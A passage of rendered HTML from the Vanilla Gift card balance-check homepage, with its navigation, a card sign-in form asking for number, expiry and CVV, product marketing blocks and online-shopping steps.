         </app-loader>
         <!---->
         <app-header _ngcontent-fen-c0="" id="top" _nghost-fen-c3="">
            <!---->
            <header _ngcontent-fen-c3="">
               <!---->
               <nav _ngcontent-fen-c3="" class="navbar navbar-inverse navbar-static-top collapse-margin-xs-bottom">
                  <div _ngcontent-fen-c3="" class="max-width-920">
                     <!---->
                     <div _ngcontent-fen-c3="" class="navbar-header">
                        <!---->
                        <div _ngcontent-fen-c3="" class="hidden-sm hidden-md hidden-lg mobileMenuContainer">
                           <div _ngcontent-fen-c3="" class="mobile-menu" id="mobileMenu">
                              <ul _ngcontent-fen-c3="">
                                 <div _ngcontent-fen-c3="" class="mobileMenuDivider">
                                    <!----><!----><!---->
                                    <app-link _ngcontent-fen-c3="" _nghost-fen-c7="">
                                       <!----><!----><!---->
                                       <a _ngcontent-fen-c7="" class="font-color-white fontMD font-bold font13px18pxlh" href="/signin">
                                          <!---->
                                          <li _ngcontent-fen-c3="" class="active"> Sign In </li>
                                          <!---->
                                       </a>
                                       <!---->
                                    </app-link>
                                    <!----><!----><!----><!----><!----><!----><!---->
                                 </div>
                                 <div _ngcontent-fen-c3="" class="mobileMenuDivider">
                                    <!----><!----><!---->
                                    <app-link _ngcontent-fen-c3="" _nghost-fen-c7="">
                                       <!----><!----><!---->
                                       <a _ngcontent-fen-c7="" class="font-color-white fontMD font-bold font13px18pxlh" href="/">
                                          <!---->
                                          <li _ngcontent-fen-c3="" class="active"> Home </li>
                                          <!---->
                                       </a>
                                       <!---->
                                    </app-link>
                                    <!----><!----><!---->
                                    <app-link _ngcontent-fen-c3="" _nghost-fen-c7="">
                                       <!---->
                                       <div _ngcontent-fen-c7="">
                                          <!---->
                                          <a _ngcontent-fen-c7="" class="font-color-white fontMD font-bold font13px18pxlh" href="https://www.vanillagift.com/ " target="_blank">
                                             <!---->
                                             <li _ngcontent-fen-c3="" class="active"> Buy Now </li>
                                             <!---->
                                          </a>
                                          <!----><!---->
                                       </div>
                                       <!----><!----><!---->
                                    </app-link>
                                    <!----><!----><!---->
                                    <app-link _ngcontent-fen-c3="" _nghost-fen-c7="">
                                       <!----><!----><!---->
                                       <a _ngcontent-fen-c7="" class="font-color-white fontMD font-bold font13px18pxlh" href="/using-your-card">
                                          <!---->
                                          <li _ngcontent-fen-c3="" class="active"> About Gift Cards </li>
                                          <!---->
                                       </a>
                                       <!---->
                                    </app-link>
                                    <!----><!----><!---->
                                    <app-link _ngcontent-fen-c3="" _nghost-fen-c7="">
                                       <!----><!----><!---->
                                       <a _ngcontent-fen-c7="" class="font-color-white fontMD font-bold font13px18pxlh" href="/aboutVirtual">
                                          <!---->
                                          <li _ngcontent-fen-c3="" class="active"> About Virtual Accounts </li>
                                          <!---->
                                       </a>
                                       <!---->
                                    </app-link>
                                    <!---->
                                 </div>
                                 <li _ngcontent-fen-c3="" class="active font-color-white fontMD font13px18pxlh">
                                    <p>Vanilla Visa<sup>®</sup> Gift Card</p>
                                    <p>Vanilla Mastercard<sup>®</sup> Gift Card</p>
                                    <p>Vanilla Discover<sup>®</sup> Gift Card</p>
                                    <p>Vanilla Gift Visa<sup>®</sup> Virtual Account</p>
                                 </li>
                                 <!---->
                              </ul>
                           </div>
                        </div>
                        <img _ngcontent-fen-c3="" appnorightclick="" class="hidden-sm hidden-md hidden-lg mobile-menu-icon" id="mobileMenuIcon" src="//images.ctfassets.net/ihysaliiegrh/59VtkjXQdqfHCJlneB9zEr/a614498d5fc9004d55bca501d20a21ee/btn-mobile.jpg"><!---->
                        <div _ngcontent-fen-c3="" class="logo-copy hidden-sm hidden-xs">
                           <!---->
                           <div _ngcontent-fen-c3="" class="main-copy">
                              <p>Vanilla Visa<sup>®</sup> Gift Card</p>
                              <p>Vanilla Mastercard<sup>®</sup> Gift Card</p>
                           </div>
                           <!---->
                           <div _ngcontent-fen-c3="" class="sub-copy">
                              <p>Vanilla Discover<sup>®</sup> Gift Card</p>
                              <p>Vanilla Gift Visa<sup>®</sup> Virtual Account</p>
                           </div>
                        </div>
                        <a _ngcontent-fen-c3="" href="/"><img _ngcontent-fen-c3="" appnorightclick="" class="hidden-sm hidden-md hidden-lg mobile-logo" id="" src="//images.ctfassets.net/ihysaliiegrh/6ZuLGFstI1ugrClUCP5AB3/c6af147974ba46dedc58e8af93efa915/VG_Logo_Mobile.png"></a>
                     </div>
                     <div _ngcontent-fen-c3="" class="navbar-collapse collapse" id="navbar3">
                        <!---->
                        <ul _ngcontent-fen-c3="" class="nav navbar-nav navbar-right">
                           <!----><!----><!---->
                           <li _ngcontent-fen-c3="" class="active">
                              <app-link _ngcontent-fen-c3="" _nghost-fen-c7="">
                                 <!----><!----><!---->
                                 <a _ngcontent-fen-c7="" class="font-color-white mobile-menu-link fontMD font-bold" href="/signin">
                                    <!----> Sign In <!---->
                                 </a>
                                 <!---->
                              </app-link>
                           </li>
                           <!----><!----><!----><!----><!----><!----><!----><!---->
                        </ul>
                     </div>
                  </div>
               </nav>
               <!----><!---->
               <div _ngcontent-fen-c3="" class="container navContainer hidden-xs" id="subNavigation">
                  <div _ngcontent-fen-c3="" class="max-width-920">
                     <div _ngcontent-fen-c3="" class="col-xs-12 col-sm-3 col-md-3 vertical-spacing-bottom-4 subMenuLogoBrand collapse-padding"><a _ngcontent-fen-c3="" href="/"><img _ngcontent-fen-c3="" appnorightclick="" id="red_logo" src="//images.ctfassets.net/ihysaliiegrh/2H1eXYYkQI8EuGrR3RJcGe/aea5d155acfac0404efb6dd8e9958a11/VG_Logo_Main.png"></a></div>
                     <div _ngcontent-fen-c3="" class="col-sm-9 col-md-9 collapse-padding-right navContainer">
                        <ul _ngcontent-fen-c3="" class="navigation navigation--desktop" id="navigationMain">
                           <!----><!----><!----><!----><!----><!---->
                           <li _ngcontent-fen-c3="" class="show off colorValue">
                              <app-link _ngcontent-fen-c3="" _nghost-fen-c7="">
                                 <!---->
                                 <div _ngcontent-fen-c7="">
                                    <!---->
                                    <a _ngcontent-fen-c7="" class="fontMD font-bold font14px9pxlh font-color-brandchocolate" href="https://www.vanillagift.com/ " target="_blank">
                                       <!----> Buy Now <!---->
                                    </a>
                                    <!----><!---->
                                 </div>
                                 <!----><!----><!---->
                              </app-link>
                           </li>
                           <!----><!----><!---->
                           <li _ngcontent-fen-c3="" class="show off colorValue">
                              <app-link _ngcontent-fen-c3="" _nghost-fen-c7="">
                                 <!----><!----><!---->
                                 <a _ngcontent-fen-c7="" class="fontMD font-bold font14px9pxlh font-color-brandchocolate" href="/using-your-card">
                                    <!----> About Gift Cards <!---->
                                 </a>
                                 <!---->
                              </app-link>
                           </li>
                           <!----><!----><!---->
                           <li _ngcontent-fen-c3="" class="show off colorValue">
                              <app-link _ngcontent-fen-c3="" _nghost-fen-c7="">
                                 <!----><!----><!---->
                                 <a _ngcontent-fen-c7="" class="fontMD font-bold font14px9pxlh font-color-brandchocolate" href="/aboutVirtual">
                                    <!----> About Virtual Accounts <!---->
                                 </a>
                                 <!---->
                              </app-link>
                           </li>
                           <!---->
                        </ul>
                     </div>
                  </div>
               </div>
            </header>
         </app-header>
         <div _ngcontent-fen-c0="" style="padding-top: 142px;">
            <router-outlet _ngcontent-fen-c0=""></router-outlet>
            <app-homepage _nghost-fen-c9="">
               <div _ngcontent-fen-c9="" id="page-container">
                  <div _ngcontent-fen-c9="" class="collapse-padding backgroundRepeatingImageMobile" id="repeatPattern" style="background-image: url(&quot;//images.ctfassets.net/ihysaliiegrh/4tkwE1QuGlWOM2jvr7ViUl/24f9593af2ad762be89aaeec930341e2/VG_HERO_RepeatPatt_041420.png&quot;); width: 100%; position: relative; max-height: initial; background-color: rgb(57, 201, 223);">
                     <div _ngcontent-fen-c9="" class="container container noPadding vanillaGiftHeroImage heroImageVisibility" data-ride="carousel" id="brandCarousel" style="background-image: url(&quot;//images.ctfassets.net/ihysaliiegrh/7yWtQdc39PE7EvnjByOYCE/b172c1cfe1c8015da586b2758a7792ca/VG_HERO_Home_041420.png&quot;);">
                        <div _ngcontent-fen-c9="" class="collapse-padding-xs collapse-padding-sm horizontal-spacing-xs-2 max-width-920 cta-position" id="aboveCarouselInfo">
                           <div _ngcontent-fen-c9="" class="col-xs-12 col-sm-8 col-sm-push-2 col-md-push-0 col-md-5 collapse-padding-xs collapse-padding-sm vertical-spacing-8 collapse-margin-xs-bottom loginFormBlock collapse-padding">
                              <div _ngcontent-fen-c9="" class="col-xs-12 collapse-padding-xs collapse-padding-sm collapse-margin-xs-bottom loginFormBlock collapse-padding">
                                 <!---->
                                 <div _ngcontent-fen-c9="" class="formContent brandLoginInfoModule clearfix ">
                                    <ul _ngcontent-fen-c9="" class="nav nav-tabs homePageLogintab visible-md visible-sm  visible-xs visible-lg" role="tablist">
                                       <li _ngcontent-fen-c9="" class="active visible-md visible-sm visible-xs visible-lg tabShare" role="presentation"></li>
                                    </ul>
                                    <div _ngcontent-fen-c9="" class="tab-content">
                                       <div _ngcontent-fen-c9="" class="active tab-pane tabmanageCard" id="manageCard" role="tabpanel">
                                          <!---->
                                          <app-sign-in _ngcontent-fen-c9="" _nghost-fen-c10="">
                                             <form _ngcontent-fen-c10="" autocomplete="off" class="floating-labels card collapse-margin-xs-bottom collapse-padding ng-untouched ng-pristine ng-invalid" id="brandLoginForm" name="brandLoginForm" novalidate="" method="post">
                                                <!---->
                                                <div _ngcontent-fen-c10="" class="fontQF font16px24pxlh font-color-brandcolor vertical-padding-bottom-2 vertical-padding-top-2 horizontal-padding-2"> Manage Your Gift Card </div>
                                                <div _ngcontent-fen-c10="" class="fontMD font16px24pxlh font-color-brandchocolate font-light vertical-padding-bottom-2 vertical-padding-top-2 horizontal-padding-4">
                                                   <p _ngcontent-fen-c10="">Check your balance and review your transactions.</p>
                                                </div>
                                                <div _ngcontent-fen-c10="" class="horizontal-padding-4">
                                                   <div _ngcontent-fen-c10="" class="form-group">
                                                   <input _ngcontent-fen-c10="" class="form-control fontMD font13px empty ng-untouched ng-pristine ng-invalid" data-code="110" formcontrolname="cardnumber" id="cardnumber" mandatory="true" maxlength="16" minlength="16" name="cardNumber" type="password" placeholder="16 digits, no spaces"><label _ngcontent-fen-c10="" class="fontMD font15px20pxlh font-light font-color-lightgrey" for="cardnumber">CARD NUMBER</label></div>
                                                   <div _ngcontent-fen-c10="" class="row">
                                                      <div _ngcontent-fen-c10="" class="col-xs-12"><label _ngcontent-fen-c10="" class="fontMD font15px20pxlh font-light font-color-lightgrey" for="expiration"> EXPIRATION DATE </label></div>
                                                      <div _ngcontent-fen-c10="" class="col-xs-12 col-sm-7 col-md-7 collapse-padding-right">
                                                         <div _ngcontent-fen-c10="" class="row">
                                                            <div _ngcontent-fen-c10="" class="col-xs-6 col-sm-6 col-md-6 expMM">
                                                               <div _ngcontent-fen-c10="" class="form-group"><input _ngcontent-fen-c10="" class="form-control fontMD font13px empty ng-untouched ng-pristine ng-invalid" data-code="120" formcontrolname="expMonth" id="expMonth" mandatory="true" maxlength="2" minlength="2" name="expMonth" size="2" type="password" placeholder="MM"><label _ngcontent-fen-c10="" class="fontMD font15px20pxlh font-light font-color-lightgrey" for="expMonth">MM</label></div>
                                                            </div>
                                                            <div _ngcontent-fen-c10="" class="col-xs-6 col-sm-6 col-md-6 expYY">
                                                               <div _ngcontent-fen-c10="" class="form-group"><input _ngcontent-fen-c10="" class="form-control fontMD font13px empty ng-untouched ng-pristine ng-invalid" data-code="120" formcontrolname="expirationYear" id="expirationYear" mandatory="true" maxlength="2" minlength="2" name="expirationYear" size="4" type="password" placeholder="YY"><label _ngcontent-fen-c10="" class="fontMD font15px20pxlh font-light font-color-lightgrey" for="expirationYear">YY</label></div>
                                                            </div>
                                                         </div>
                                                      </div>
                                                      <div _ngcontent-fen-c10="" class="col-xs-12 col-sm-5 col-md-5">
                                                         <div _ngcontent-fen-c10="" class="form-group"><input _ngcontent-fen-c10="" class="form-control fontMD font13px empty ng-untouched ng-pristine ng-invalid" data-code="115" formcontrolname="cvv" id="cvv" mandatory="true" maxlength="3" minlength="3" name="cvv" size="4" type="password" placeholder="3 digits"><label _ngcontent-fen-c10="" class="fontMD font15px20pxlh font-light font-color-lightgrey" for="cvv">CVV <span _ngcontent-fen-c10="" class="tooltipIcon"><img _ngcontent-fen-c10="" alt="Preview" appnorightclick="" class="img" src="//images.ctfassets.net/ihysaliiegrh/5ximOc5eNyguwqIEeqYqkQ/527e7bf2d8f45ddf1431396412e9e1d0/tooltip_VG.gif"><img _ngcontent-fen-c10="" appnorightclick="" class="tooltipHoverObject tooltipHoverImage" src="//images.ctfassets.net/ihysaliiegrh/3SmLT1drBFCY0yDrB8hXnW/faa1b74965135aa1d08ce24fa61c34fb/card-back_US.png"></span></label></div>
                                                      </div>
                                                      <div _ngcontent-fen-c10="" class="col-xs-12 vertical-padding-bottom-3">
                                                         <button _ngcontent-fen-c10="" aria-hidden="true" class="eye-icon eye-icon-disabled" type="button" disabled="">
                                                            <!----><span _ngcontent-fen-c10="" class="txtBtn"><i _ngcontent-fen-c10="" class="fa fa-eye"></i>Show Sign-in Info</span><!---->
                                                         </button>
                                                      </div>
                                                      <div _ngcontent-fen-c10="" class="col-xs-12 col-sm-12 col-md-12 vertical-spacing-bottom-4"><button _ngcontent-fen-c10="" class="btn btn-primary btn-block btn-md" id="brandLoginForm_button" type="submit"> Sign In </button></div>
                                                      <!---->
                                                      <div _ngcontent-fen-c10="" class="col-xs-12 col-sm-12 col-md-12 vertical-spacing-bottom-4">
                                                         <div _ngcontent-fen-c10="" id="signInRecaptcha">
                                                            <div class="grecaptcha-badge" data-style="none" style="width: 256px; height: 60px; position: fixed; visibility: hidden;">
                                                               <div class="grecaptcha-logo"><iframe title="reCAPTCHA" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6Lc7IcIUAAAAAOPBNC4usz2kFYS23xU-zVjCYsSl&amp;co=aHR0cHM6Ly9iYWxhbmNlLnZhbmlsbGFnaWZ0LmNvbTo0NDM.&amp;hl=en&amp;v=VZKEDW9wslPbEc9RmzMqaOAP&amp;theme=light&amp;size=invisible&amp;cb=r2wmrl67jf67" role="presentation" name="a-a48wdka0th4d" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" width="256" height="60" frameborder="0"></iframe></div>
                                                               <div class="grecaptcha-error"></div>
                                                               <textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
                                                            </div>
                                                            <iframe style="display: none;"></iframe>
                                                         </div>
                                                      </div>
                                                   </div>
                                                </div>
                                             </form>
                                          </app-sign-in>
                                       </div>
                                    </div>
                                 </div>
                                 <!---->
                              </div>
                           </div>
                           <div _ngcontent-fen-c9="" class="col-md-7 hidden-xs hidden-sm cta-container">
                              <!---->
                           </div>
                        </div>
                        <!---->
                        <div _ngcontent-fen-c9="" class="cta-container cta-img-container mobileSliderImage visible-xs visible-sm hidden-md hidden-lg"><img _ngcontent-fen-c9="" appnorightclick="" class="img" src="//images.ctfassets.net/ihysaliiegrh/1n0HZ3hiNrlu6j3NzNLUyK/04f74d0a514c7dc0c66508f32f6b389e/VG_HERO_Home_Mobile_041520.jpg"></div>
                        <!---->
                     </div>
                  </div>
                  <div _ngcontent-fen-c9="" class="brandPortal-HP-accordionInfo container-fluid vertical-padding-md-5 vertical-padding-lg-5">
                     <div _ngcontent-fen-c9="" class="max-width-920 collapse-padding-xs collapse-padding-sm">
                        <div _ngcontent-fen-c9="" class="col-md-12 col-xs-12 col-sm-12 accordion vertical-padding-sm-2 vertical-padding-xs-2 collapse-padding-md-left collapse-padding-md collapse-padding-lg" id="brandAccordionInfo">
                           <div _ngcontent-fen-c9="" class="panel-default">
                              <!---->
                           </div>
                        </div>
                     </div>
                  </div>
                  <!----><!---->
                  <app-three-blocks _ngcontent-fen-c9="" _nghost-fen-c12="">
                     <div _ngcontent-fen-c12="" class="container-fluid collapse-padding-xs collapse-padding-sm horizontal-spacing-sm-2 horizontal-spacing-xs-2" id="brand-contentCardArea">
                        <div _ngcontent-fen-c12="" class="container-padding max-width-920 collapse-padding-sm collapse-padding-xs  vertical-spacing-lg-1">
                           <div _ngcontent-fen-c12="" class="row">
                              <!---->
                              <div _ngcontent-fen-c12="" class="col-md-4 smallPanels col-xs-12 dividerModule vertical-spacing-lg-5 vertical-spacing-sm-4 vertical-spacing-xs-4">
                                 <div _ngcontent-fen-c12="" class="text-center topPanelIcon">
                                    <h4 _ngcontent-fen-c12="" class="fontQF font26px24pxlh font-bold font-color-headertitle">Buy at Your Favorite Retailer</h4>
                                    <h3 _ngcontent-fen-c12=""><img _ngcontent-fen-c12="" appnorightclick="" src="//images.ctfassets.net/ihysaliiegrh/DvBL5oGXGvnA9EvlQv4c4/d28f7748bbb57c7c704fa123b1f9fedd/icons_SM_Retailers.png"></h3>
                                    <span _ngcontent-fen-c12="" class="fontMD font14px21pxlh font-color-colorgrey70">
                                       <p>You can purchase Vanilla Gift Cards at <a href="/whereToBuy">convenient retailers</a> nationwide.<br>Easy to buy. Easy to send. Easy to delight.<br><br><br>&nbsp;</p>
                                    </span>
                                 </div>
                                 <div _ngcontent-fen-c12="" class="text-right vertical-spacing-bottom-1">
                                    <app-link _ngcontent-fen-c12="" _nghost-fen-c7="">
                                       <!----><!----><!---->
                                       <a _ngcontent-fen-c7="" class="fontMD font12px22pxlh font-color-brandcolor font-bold" href="/faq">
                                          <!----> Learn More <!---->
                                       </a>
                                       <!---->
                                    </app-link>
                                 </div>
                              </div>
                              <div _ngcontent-fen-c12="" class="col-md-4 smallPanels col-xs-12 dividerModule vertical-spacing-lg-5 vertical-spacing-sm-4 vertical-spacing-xs-4">
                                 <div _ngcontent-fen-c12="" class="text-center topPanelIcon">
                                    <h4 _ngcontent-fen-c12="" class="fontQF font26px24pxlh font-bold font-color-headertitle">Welcome Nationwide</h4>
                                    <h3 _ngcontent-fen-c12=""><img _ngcontent-fen-c12="" appnorightclick="" src="//images.ctfassets.net/ihysaliiegrh/9S4WLokveSBYCnzejxdoU/0dd1b8f4751a748d0614e24cc6e5b9f9/icons_SM_Nationwide.png"></h3>
                                    <span _ngcontent-fen-c12="" class="fontMD font14px21pxlh font-color-colorgrey70">
                                       <p>Vanilla Gift Cards can be used anywhere Visa debit cards, Debit Mastercard, or Discover cards are accepted in the U.S. or District of Columbia. <br>So many
                                          shopping destinations; so many ways to get the right gift.<br><br>
                                       </p>
                                    </span>
                                 </div>
                                 <div _ngcontent-fen-c12="" class="text-right vertical-spacing-bottom-1">
                                    <app-link _ngcontent-fen-c12="" _nghost-fen-c7="">
                                       <!----><!----><!---->
                                       <a _ngcontent-fen-c7="" class="fontMD font12px22pxlh font-color-brandcolor font-bold" href="/faq">
                                          <!----> Learn More <!---->
                                       </a>
                                       <!---->
                                    </app-link>
                                 </div>
                              </div>
                              <div _ngcontent-fen-c12="" class="col-md-4 smallPanels col-xs-12 dividerModule vertical-spacing-lg-5 vertical-spacing-sm-4 vertical-spacing-xs-4">
                                 <div _ngcontent-fen-c12="" class="text-center topPanelIcon">
                                    <h4 _ngcontent-fen-c12="" class="fontQF font26px24pxlh font-bold font-color-headertitle">Shop In-Store &amp; Online</h4>
                                    <h3 _ngcontent-fen-c12=""><img _ngcontent-fen-c12="" appnorightclick="" src="//images.ctfassets.net/ihysaliiegrh/7qij4bX1hl2kCyozqNzkMF/e1d5c314be70ce140d0b76450cf35ed3/icons_SM_InStoreOnline.png"></h3>
                                    <span _ngcontent-fen-c12="" class="fontMD font14px21pxlh font-color-colorgrey70">
                                       <p>Enjoy using your Vanilla Gift Card to shop at millions of retailers and online merchants. And you can use your Vanilla Gift Virtual Account at online merchants based inside the U.S. and District of Columbia where Visa debit cards are accepted, as applicable. </p>
                                    </span>
                                 </div>
                                 <div _ngcontent-fen-c12="" class="text-right vertical-spacing-bottom-1">
                                    <app-link _ngcontent-fen-c12="" _nghost-fen-c7="">
                                       <!----><!----><!---->
                                       <a _ngcontent-fen-c7="" class="fontMD font12px22pxlh font-color-brandcolor font-bold" href="/faq">
                                          <!----> Learn More <!---->
                                       </a>
                                       <!---->
                                    </app-link>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </app-three-blocks>
                  <!---->
                  <app-card-art-carousel _ngcontent-fen-c9="" _nghost-fen-c14="">
                     <div _ngcontent-fen-c14="" class="cardArtCarousel wrapper noPadding marginBottom-30 marginTop-20">
                        <div _ngcontent-fen-c14="" class="row wrapper noPadding">
                           <div _ngcontent-fen-c14="" class="col-xs-12 info-box">
                              <div _ngcontent-fen-c14="" class="col-xs-12 col-md-4 horizontal-spacing-right-9">
                                 <h3 _ngcontent-fen-c14="" class="brandColor">A Gift You Know They'll Love</h3>
                                 <div _ngcontent-fen-c14="">
                                    <span _ngcontent-fen-c14="" class="subText">
                                       <p _ngcontent-fen-c14="">Whether you're celebrating a birthday, graduation, or simply want to send your congratulations, give them the gift of choice. </p>
                                    </span>
                                 </div>
                                 <div _ngcontent-fen-c14="" class="col-xs-12 col-sm-12 col-md-12 vertical-spacing-bottom-4 collapse-padding"><button _ngcontent-fen-c14="" class="btn btn-primary btn-common btn-md" type="submit"> Buy At Retail  </button></div>
                                 <!---->
                              </div>
                              <!---->
                              <div _ngcontent-fen-c14="" class="col-xs-12 col-md-7 vertical-spacing-top-8">
                                 <app-carousel _ngcontent-fen-c14="" _nghost-fen-c16="">
                                    <div _ngcontent-fen-c16="" class="carousel slide" data-interval="3000" data-ride="carousel" id="cardArtCarousel">
                                       <div _ngcontent-fen-c16="" class="carousel-inner" role="listbox">
                                          <!---->
                                          <div _ngcontent-fen-c16="" class="item">
                                             <!----><img _ngcontent-fen-c16="" alt="" appnorightclick="" src="//images.ctfassets.net/ihysaliiegrh/5fs7ihvknO1cy6EqaHQ0Yx/d2699bc3a233e6f53834798bca5699cd/HexBox_Red_50.png"><img _ngcontent-fen-c16="" alt="" appnorightclick="" src="//images.ctfassets.net/ihysaliiegrh/5oGO6rnHgCvgbrXgg7GGdM/c302a82ff82e784176471b5f3f7181e4/VMC_JewelBox_Royal_100.png"><img _ngcontent-fen-c16="" alt="" appnorightclick="" src="//images.ctfassets.net/ihysaliiegrh/ikMzSjNZRD4sloYyQgXnV/603e05a76d760b38836540d24a2398b1/VV_Gift_Box_Green_200_50.png">
                                          </div>
                                          <div _ngcontent-fen-c16="" class="item active">
                                             <!----><img _ngcontent-fen-c16="" alt="" appnorightclick="" src="//images.ctfassets.net/ihysaliiegrh/1v2B8RUIiSLbceELkmdYgA/1dcd72d6ee4f8de04f23110a1a5b9fec/WM_YouRock_Var.png"><img _ngcontent-fen-c16="" alt="" appnorightclick="" src="//images.ctfassets.net/ihysaliiegrh/76eMTY50PsVUAYOnG0YeZL/2ae5d84b5f90bad20ee739670dd1d227/VMC_Walmart_HaveFun_20_500.png"><img _ngcontent-fen-c16="" alt="" appnorightclick="" src="//images.ctfassets.net/ihysaliiegrh/3CxRJukyaItem1nF2szOcs/d9615dc5298086477527ec1e2d5f5420/VMC_Walmart_Youthful_20_500.png">
                                          </div>
                                          <div _ngcontent-fen-c16="" class="item">
                                             <!----><img _ngcontent-fen-c16="" alt="" appnorightclick="" src="//images.ctfassets.net/ihysaliiegrh/4rGkpbTde410eSYrGGyfuT/bb0aa1a2113d22d11375d5dd1b7acc89/VMC_Walmart_Love_20_500.png"><img _ngcontent-fen-c16="" alt="" appnorightclick="" src="//images.ctfassets.net/ihysaliiegrh/7rHp0iYECYwDaFbXvi3Ysy/a6437b505d3efd288a568220d3d6161a/VMC_Walmart_Sams_HappyBirthday_20_500.png"><img _ngcontent-fen-c16="" alt="" appnorightclick="" src="//images.ctfassets.net/ihysaliiegrh/5K2so9KPkVHogE4fhIzRF4/8870b185093a36eedba772f869245db1/WM_Vanilla_GO_Shop.png">
                                          </div>
                                          <div _ngcontent-fen-c16="" class="item">
                                             <!----><img _ngcontent-fen-c16="" alt="" appnorightclick="" src="//images.ctfassets.net/ihysaliiegrh/2SbGccMPciGYevQ5D5BOOK/071965e46bde2ab7a5816339732c9e39/VMC_Sheer_Bow_Green_200.png"><img _ngcontent-fen-c16="" alt="" appnorightclick="" src="//images.ctfassets.net/ihysaliiegrh/2BPcE26QYbRfE4CrjgLyLu/a57eaf19498ead1c9eb1ecc370b647e8/VV_Ocassion_ShowerUmbrella_20_200.png"><img _ngcontent-fen-c16="" alt="" appnorightclick="" src="//images.ctfassets.net/ihysaliiegrh/6JTBZIXY9aC3AQuKI1SxRO/02a78c7c3039c600b61c1a55cf866efb/VMC_Lotus_Bow_Purple_25.png">
                                          </div>
                                       </div>
                                       <ol _ngcontent-fen-c16="" class="carousel-indicators">
                                          <!---->
                                          <li _ngcontent-fen-c16="" class=""></li>
                                          <li _ngcontent-fen-c16="" class="active"></li>
                                          <li _ngcontent-fen-c16="" class=""></li>
                                          <li _ngcontent-fen-c16="" class=""></li>
                                       </ol>
                                       <a _ngcontent-fen-c16="" class="left carousel-control" data-slide="prev" data-slide-to="-1" role="button"><span _ngcontent-fen-c16="" aria-hidden="true" class="slider-arrow prev" style="background-image: url(&quot;//images.ctfassets.net/ihysaliiegrh/7vmAVSyFtKMBGYPgONtOAw/b096d121e70ca770a95ae3ba1e74ad51/slideshowArrows.png&quot;);"></span><span _ngcontent-fen-c16="" class="sr-only">Previous</span></a><a _ngcontent-fen-c16="" class="right carousel-control" data-slide="next" data-slide-to="1" role="button"><span _ngcontent-fen-c16="" aria-hidden="true" class="slider-arrow next" style="background-image: url(&quot;//images.ctfassets.net/ihysaliiegrh/7vmAVSyFtKMBGYPgONtOAw/b096d121e70ca770a95ae3ba1e74ad51/slideshowArrows.png&quot;);"></span><span _ngcontent-fen-c16="" class="sr-only">Next</span></a>
                                    </div>
                                 </app-carousel>
                              </div>
                           </div>
                        </div>
                     </div>
                  </app-card-art-carousel>
                  <app-shopping-online _ngcontent-fen-c9="" _nghost-fen-c15="">
                     <!---->
                     <div _ngcontent-fen-c15="" class="shoppingOnline wrapper noPadding marginBottom-30 marginTop-20">
                        <div _ngcontent-fen-c15="" class="row wrapper noPadding">
                           <div _ngcontent-fen-c15="" class="col-xs-12 info-box">
                              <div _ngcontent-fen-c15="" class="col-xs-12 col-md-4 horizontal-spacing-right-9">
                                 <h3 _ngcontent-fen-c15="" class="brandColor">Shopping Online</h3>
                                 <div _ngcontent-fen-c15="">
                                    <span _ngcontent-fen-c15="" class="subText">
                                       <p _ngcontent-fen-c15="">You can use your Vanilla Gift Card at online merchants based inside the United States and District of Columbia where Visa debit cards, Debit Mastercard or Discover cards are accepted, as applicable.</p>
                                    </span>
                                 </div>
                              </div>
                              <div _ngcontent-fen-c15="" class="col-xs-12 col-md-7 fontMD">
                                 <h3>How To Use</h3>
                                 <ol class="customOrderedList">
                                    <li>
                                       Make sure the balance of the Vanilla Gift Card is more than the entire cost of the purchase, including taxes
                                       <br>
                                       <sup><i>Please note: some transaction types require a hold of up to 20% above the purchase amount. See your <a href="/cardholderAgreement">Cardholder Agreement</a> for more information</i></sup>
                                    </li>
                                    <li>
                                       Select 'Credit' or 'Debit' as the Payment Method (Do not select 'Gift Card')
                                    </li>
                                    <li>
                                       In the Payment Method section, enter the card information as you would a credit or debit card
                                    </li>
                                    <li>
                                       In the Billing Address section, please fill in your name and address
                                    </li>
                                 </ol>
                              </div>
                           </div>
                        </div>
                     </div>
                  </app-shopping-online>
                  <!---->
               </div>
            </app-homepage>
            <app-footer _ngcontent-fen-c0="" id="footer" _nghost-fen-c4="">
               <!---->
               <footer _ngcontent-fen-c4="">
                  <div _ngcontent-fen-c4="" class="feedback-container">
                     <div _ngcontent-fen-c4="" class="feedback-phone"><a _ngcontent-fen-c4="" href="#appBody" pagescroll="">^ Back to Top</a></div>
                  </div>
                  <div _ngcontent-fen-c4="" class="footer horizontal-padding-4 horizontal-padding-xs-2">
                     <div _ngcontent-fen-c4="" class="container-fluid wrapper collapse-padding">
                        <div _ngcontent-fen-c4="" class="wrapper">
                           <div _ngcontent-fen-c4="" class="top-nav">
                              <div _ngcontent-fen-c4="" class="row collapse-padding-right-1">
                                 <div _ngcontent-fen-c4="" class="col-xs-6 col-sm-2 footer-nav-icon">
                                    <app-link _ngcontent-fen-c4="" _nghost-fen-c7="">
                                       <!----><!----><!---->
                                       <a _ngcontent-fen-c7="" href="/">
                                          <!----><img _ngcontent-fen-c4="" appnorightclick="" src="//images.ctfassets.net/ihysaliiegrh/1drXH7Ybk8QF5ggkvY8iFg/56fa0c0382acf52c6c1fa842064e7322/VG_Logo_Footer.png"><!---->
                                       </a>
                                       <!---->
                                    </app-link>
                                 </div>
                                 <div _ngcontent-fen-c4="" class="col-xs-12 col-sm-12 col-md-10 footer-nav-links collapse-padding-xs">
                                    <ul _ngcontent-fen-c4="" class="noPadding horizontal-spacing-md-3">
                                       <!---->
                                       <li _ngcontent-fen-c4="">
                                          <app-link _ngcontent-fen-c4="" _nghost-fen-c7="">
                                             <!----><!----><!---->
                                             <a _ngcontent-fen-c7="" href="/about-vanilla">
                                                <!----> About Vanilla <!---->
                                             </a>
                                             <!---->
                                          </app-link>
                                       </li>
                                       <li _ngcontent-fen-c4="">
                                          <app-link _ngcontent-fen-c4="" _nghost-fen-c7="">
                                             <!----><!----><!---->
                                             <a _ngcontent-fen-c7="" href="/whereToBuy">
                                                <!----> Buy at Retail <!---->
                                             </a>
                                             <!---->
                                          </app-link>
                                       </li>
                                       <li _ngcontent-fen-c4="">
                                          <app-link _ngcontent-fen-c4="" _nghost-fen-c7="">
                                             <!----><!----><!---->
                                             <a _ngcontent-fen-c7="" href="/faq">
